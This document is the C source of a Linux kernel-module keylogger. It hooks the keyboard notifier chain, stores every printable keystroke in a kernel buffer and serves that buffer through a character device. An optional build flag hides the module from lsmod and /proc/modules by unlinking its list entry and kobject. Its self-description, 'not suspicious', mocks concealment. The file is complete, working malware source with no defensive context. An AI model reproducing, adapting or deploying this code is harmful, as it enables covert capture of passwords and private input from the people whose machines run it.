#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#ifdef HIDE_MODULE
#include <linux/list.h>
#include <linux/kobject.h>
#endif

MODULE_DESCRIPTION("A keyboard driver that is not suspicious");
MODULE_AUTHOR("God knows who");
MODULE_LICENSE("GPL");

#define DEVICE_NAME "kl0"
unsigned major;

#define BUFLEN 1024
static char input_buf[BUFLEN];
unsigned buf_count = 0;

static int kl_notifier_call(struct notifier_block *, unsigned long, void *);
static ssize_t kl_device_read(struct file *, char __user *, size_t, loff_t *);

static struct notifier_block kl_notifier_block = { .notifier_call =
							   kl_notifier_call };

static struct file_operations fops = { .read = kl_device_read };

static int kl_notifier_call(struct notifier_block *nb, unsigned long action,
			    void *data)
{
	struct keyboard_notifier_param *param = data;
	char c = param->value;

	if (!param->down || action != KBD_KEYSYM) {
		/* user not pressing key or event is not KBD_KEYSYM */
		return NOTIFY_DONE;
	}

	if (c == 0x01) {
		input_buf[buf_count++] = 0x0a;
	} else if (c >= 0x20 && c < 0x7f) {
		input_buf[buf_count++] = c;
	}

	if (buf_count >= BUFLEN) {
		buf_count = 0;
		memset(input_buf, 0, BUFLEN);
	}

	return NOTIFY_OK;
}

static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
			      loff_t *offset)
{
	size_t buflen = strlen(input_buf);
	int ret;

	ret = copy_to_user(buf, input_buf, buflen);
	if (ret) {
		printk(KERN_ERR
		       "keylog: Unable to copy from kernel buffer to user space buffer\n");
		return -ret;
	}

	memset(input_buf, 0, BUFLEN);
	buf_count = 0;

	return buflen;
}

static int __init kl_init(void)
{
	int ret;

	ret = register_chrdev(0, DEVICE_NAME, &fops);
	if (ret < 0) {
		printk(KERN_ERR
		       "keylog: Unable to register character device\n");
		return ret;
	}
	major = ret;
	printk(KERN_INFO "keylog: Registered device major number %u\n", major);

	ret = register_keyboard_notifier(&kl_notifier_block);
	if (ret) {
		printk(KERN_ERR
		       "keylog: Unable to register keyboard notifier\n");
		return -ret;
	}

	memset(input_buf, 0, BUFLEN);

#ifdef HIDE_MODULE
	/* Hide myself from lsmod and /proc/modules :) */
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
#endif

	return 0;
}

static void __exit kl_exit(void)
{
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&kl_notifier_block);
}

module_init(kl_init);
module_exit(kl_exit);
